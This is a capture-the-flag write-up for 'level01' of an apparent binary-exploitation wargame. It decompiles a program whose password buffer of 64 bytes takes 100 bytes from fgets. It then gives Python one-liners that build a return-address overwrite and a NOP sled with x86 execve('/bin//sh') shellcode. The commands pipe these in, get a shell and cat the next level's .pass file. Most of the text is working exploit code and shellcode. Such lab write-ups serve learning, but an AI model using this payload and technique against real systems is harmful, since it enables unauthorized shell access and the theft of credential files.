#LEVEL 01

* decompile the binary
    ```c
    char in_user_name[256];
    char *user = "dat_wil";

    int verify_user_name() { return strncmp(user, in_user_name, 7); }

    int main() {
        int error;
        char password[64];
        ...
        fgets(in_user_name, 256, stdin);
        error = verify_user_name();
        if (error == 0) {
            fgets(password, 100, stdin);
        }
        ...
    }
    ```
  - store string username and compare it to `"dat_wil"`
  - if equal store string password
    + store 100 byte in buffer of 64 byte so we can override the return address

  ___

* prepare
    - python -c 'print "dat_wil"; print " " * 76 + "\x00\x00\x00\x00" + "\xc9\xd8\xff\xff"' > input
    - python -c 'print "\x90" * 100 + "\x31\xC9\xF7\xE1\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xB0\x0B\xCD\x80"' > shell_code
  ___

* exec bin: `cat input - | ./level01 $(cat shell_code)`
    - got the shell prompt
    - cat /home/users/level01/.pass -> flag

* explanation
    ```
    $ \x00\x00\x00\x00 -> ebp value in stack to not make the programe try to get the value from a bad address

    $ \xc9\xd8\xff\xff -> shell code stack address

    $ \x31\xC9\xF7\xE1\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xB0\x0B\xCD\x80 -> shell_code
    ```